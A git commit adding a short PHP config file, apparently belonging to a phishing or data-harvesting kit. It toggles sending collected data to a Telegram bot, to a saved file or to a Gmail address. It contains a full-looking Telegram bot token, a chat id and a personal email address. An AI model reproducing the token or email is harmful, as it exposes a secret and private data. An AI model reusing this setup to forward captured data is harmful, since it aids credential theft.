1e1ef2493a4a88dea88e116caf3ab4b189946fb7
teoklk <65790571+rdxvx@users.noreply.github.com>
2021-09-03 06:24:16 -0300

    Add files via upload

---
+++ asd/config.php
@@ -0,0 +1,16 @@
+<?php
+// Envio telegram
+// true = SI | false = NO
+$telegram_send = true;
+$bottoken = "1944207228:AAEJ8yd6o_NbupumFJByhjg_M0rg-7hUWmY";
+$chatid = "1390883125";
+
+// Guardar archivo
+// true = SI | false = NO
+$file_save = false;
+
+// Envio Gmail
+// true = SI | false = NO
+$email_send = false;
+$email = "santivho37@gmail.com";
+?>
